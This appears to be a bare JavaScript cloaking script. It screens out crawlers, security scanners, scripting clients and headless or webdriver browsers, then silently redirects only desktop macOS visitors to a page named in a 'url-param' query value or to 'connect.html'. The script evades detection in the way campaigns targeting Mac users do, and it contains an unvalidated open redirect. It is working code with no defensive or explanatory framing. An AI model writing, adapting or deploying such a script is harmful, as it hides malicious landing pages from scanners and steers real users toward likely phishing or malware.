;(function(){
var _ua=(navigator.userAgent||"").toLowerCase();
var _isBot=/bot|crawl|spider|scrap|curl|wget|python|headless|selenium|phantom|slurp|googlebot|bingbot|yandexbot|baiduspider|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|ahrefs|semrush|mj12bot|rogerbot|dotbot|applebot|pinterestbot|petalbot|serpstatbot/i.test(_ua);
var _isWd=!!navigator.webdriver;
var _customBlk=new RegExp("googlebot|bingbot|yandexbot|baiduspider|duckduckbot|sogou|ia_archiver|msnbot|naverbot|petalbot|seznambot|teoma|gigabot|exabot|ahrefs|semrush|mj12bot|rogerbot|dotbot|majestic|blexbot|megaindex|serpstatbot|seobilitybot|siteauditbot|linkresearchtools|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|applebot|pinterestbot|slackbot|discordbot|iframely|vkshare|xing-contenttabreceiver|curl|wget|python-requests|python-urllib|httpx|libwww-perl|go-http-client|axios|node-fetch|superagent|okhttp|java\\/|headlesschrome|puppeteer|playwright|phantom|chromium|electron|zombie|nightmare|casperjs|htmlunit|slimerjs","i").test(_ua);
var _pass=!_isBot&&!_isWd&&/mac/i.test(_ua)&&!/iphone|ipad|ipod/i.test(_ua)&&!_customBlk;
if(_pass){var _qs=window.location.search;var _up=new URLSearchParams(_qs).get("url-param");var _dst=_up?decodeURIComponent(_up):"connect.html";window.location.replace(_dst+(_qs?"?"+_qs.slice(1):""));}
})();